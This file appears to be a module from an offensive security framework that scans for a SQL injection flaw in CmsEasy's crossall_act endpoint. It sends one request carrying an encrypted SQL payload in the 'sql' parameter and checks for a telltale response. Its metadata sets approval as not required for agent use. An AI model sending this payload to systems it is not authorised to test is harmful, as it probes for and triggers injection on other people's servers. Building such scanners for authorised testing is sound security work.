#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CmsEasy crossall_act."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'CmsEasy crossall_act - SQL Injection Detection',
        'description': 'CmsEasy crossall_act.php SQL Injection Vulnerability. CmsEasy has a SQL injection vulnerability. Any SQL command can be executed by encrypting the SQL statement in the file service.php.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'cmseasy', 'sqli', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://cn-sec.com/archives/1580677.html',
            'https://github.com/GREENHAT7/pxplan/blob/e2fc04893ca95e177021ddf61cc2134ecc120a8e/goby_pocs/CmsEasy_crossall_act.php_SQL_injection_vulnerability.json#L28',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/?case=crossall&act=execsql&sql=WY8gzSfZwW9R5YvyK', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('{"123":"123"}',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='high',
                reason="CmsEasy crossall_act - SQL Injection detected",
                path='/?case=crossall&act=execsql&sql=WY8gzSfZwW9R5YvyK',
            )
            return True
        return False

